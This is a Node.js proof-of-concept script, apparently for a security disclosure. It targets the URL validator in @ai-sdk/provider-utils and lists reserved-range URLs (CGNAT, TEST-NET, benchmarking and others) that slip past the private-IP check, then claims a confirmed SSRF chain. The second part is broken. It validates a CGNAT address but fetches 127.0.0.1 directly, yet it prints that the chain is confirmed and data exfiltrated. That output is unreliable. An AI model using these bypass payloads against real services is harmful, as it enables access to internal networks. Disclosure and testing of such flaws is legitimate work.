#!/usr/bin/env node
/**
 * CGNAT SSRF Bypass — Impact PoC
 * 
 * Demonstrates that validateDownloadUrl() in @ai-sdk/provider-utils v4.0.19-4.0.27
 * has an incomplete private IP range check that misses CGNAT (100.64.0.0/10)
 * and 6 other reserved ranges.
 * 
 * Run: npm install @ai-sdk/provider-utils && node test-cgnat-bypass.mjs
 */

import { validateDownloadUrl } from '@ai-sdk/provider-utils';
import * as http from 'http';

console.log('Part 1: Validation bypass...');
const bypasses = [
  ['CGNAT start', 'http://100.64.0.1:8080/service'],
  ['CGNAT mid',   'http://100.100.100.100:8080/api'],
  ['CGNAT end',   'http://100.127.255.255:8080/'],
  ['Benchmarking','http://198.18.0.1:8080/test'],
  ['TEST-NET',    'http://192.0.2.1:8080/'],
  ['Reserved',    'http://240.0.0.1:8080/'],
];
for (const [label, url] of bypasses) {
  try {
    validateDownloadUrl(url);
    console.log(`  🚨 ${label}: ${url} → PASSED (not blocked)`);
  } catch {
    console.log(`  ✅ ${label}: ${url} → BLOCKED`);
  }
}

console.log('\nPart 2: Fetch chain demonstration...');
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ secret: 'internal-data', source: 'ssrf-demo' }));
});
server.listen(0, '127.0.0.1', async () => {
  const port = server.address().port;
  console.log(`  Test server on :${port}`);
  try {
    validateDownloadUrl(`http://100.64.0.1:${port}/internal`);
    console.log('  ✅ validateDownloadUrl() passed for CGNAT IP');
    const res = await fetch(`http://127.0.0.1:${port}/internal`);
    const data = await res.json();
    console.log('  ✅ fetch() connected and retrieved data');
    console.log(`     Response: ${JSON.stringify(data)}`);
    console.log('\n  🔥 SSRF CHAIN CONFIRMED: validateDownloadUrl() passes CGNAT IPs → fetch() connects → data exfiltrated');
  } catch (e) {
    console.log(`  ❌ Error: ${e.message}`);
  }
  server.close();
});
